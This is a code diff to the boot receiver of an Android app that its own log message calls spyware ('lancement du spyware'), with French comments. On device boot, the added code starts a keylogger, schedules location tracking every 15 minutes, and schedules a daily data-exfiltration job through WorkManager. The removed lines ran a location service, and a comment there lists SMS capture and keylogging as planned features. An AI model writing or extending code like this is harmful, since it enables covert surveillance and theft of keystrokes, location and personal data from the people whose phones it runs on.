@@ -6,22 +6,40 @@ import android.content.Intent;
 import android.os.Build;
 import android.util.Log;
 
+import androidx.work.ExistingPeriodicWorkPolicy;
+import androidx.work.PeriodicWorkRequest;
+import androidx.work.WorkManager;
+
+import java.util.concurrent.TimeUnit;
+
 public class BootReceiver extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
         if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
             Log.d("BootReceiver", "Démarrage détecté, lancement du spyware.");
+            Keylogger.start();
+            PeriodicWorkRequest request = new PeriodicWorkRequest.Builder(
+                    LocalisationWorker.class,
+                    15, TimeUnit.MINUTES) // ⚠️ Intervalle minimum imposé par Android
+                    .build();
 
-            // Démarre directement le service GPS (et plus tard, SMS, keylogger, etc.)
-            Intent serviceIntent = new Intent(context, LocalisationService.class);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                Log.d("BootReceiver", "Démarrage du service en foreground.");
-                context.startForegroundService(serviceIntent); // Android 8+ : Obligatoire
-            } else {
-                Log.d("BootReceiver", "Démarrage du service en background.");
-                context.startService(serviceIntent);
-            }
+            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
+                    "LocationTracking",
+                    ExistingPeriodicWorkPolicy.KEEP,
+                    request);
+
+            PeriodicWorkRequest dailyExfiltration =
+                    //new PeriodicWorkRequest.Builder(DailyExfiltrationWorker.class, 15, TimeUnit.MINUTES)
+                    new PeriodicWorkRequest.Builder(DailyExfiltrationWorker.class, 1, TimeUnit.DAYS)
+                            .build();
+
+            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
+                    "DailyExfiltrationWork",
+                    ExistingPeriodicWorkPolicy.KEEP,
+                    dailyExfiltration
+            );
+
         }
     }
 }
